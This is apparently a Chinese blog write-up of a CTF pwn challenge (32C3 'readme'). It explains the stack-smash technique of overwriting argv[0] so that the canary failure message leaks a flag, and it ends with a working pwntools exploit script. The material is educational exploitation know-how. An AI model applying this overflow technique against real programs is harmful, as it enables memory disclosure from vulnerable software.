---
title: 花式栈溢出- stack smash1
date: 2020-07-09 13:03:29
updated: 2020-07-09 13:03:29
tags:
    - 花式栈溢出
    - wiki
    - pwn
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.原理

在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下

```c
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 __fortify_fail 函数中就会输出我们想要的信息。

# 2.查看

 2015 年 32C3 CTF readme 

![image.png](https://i.loli.net/2020/11/17/3CEzjG5Xm7roRuD.png)

# 3.ida分析

![image.png](https://i.loli.net/2020/11/17/5ljeRyXrosHCZT4.png)

![image.png](https://i.loli.net/2020/11/17/sILXUFaxC8KrwyJ.png)

![image.png](https://i.loli.net/2020/11/17/D8zvnygBq2YbJxm.png)

输入的覆写了flag、被置为0

由于在 ELF 内存映射时，bss 段会被映射两次，所以flag在内存中页存在两处

# 4.gdb调试

![image.png](https://i.loli.net/2020/11/17/YWig8OyeCmlZAkK.png)

找到了第二处flag的地址

然后需要找到名称在栈内偏移

断点在main函数

![image.png](https://i.loli.net/2020/11/17/QTIDkFABEpLjxPU.png)

由于我们读入的字符串的起始地址其实就是调用 __IO_gets 之前的 rsp，所以我们把断点下在 call 处

![image.png](https://i.loli.net/2020/11/17/mUQc7ea6ghwJWdY.png)

# 5.编写脚本

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import *
context.log_level = 'debug'
p=process('./smashes')


payload='a'*0x218+p64(0x400d20)
p.recvuntil('name? ')
p.sendline(payload)
p.recvuntil('flag: ')
p.sendline('bbbb')
t = p.recv()

p.interactive()
```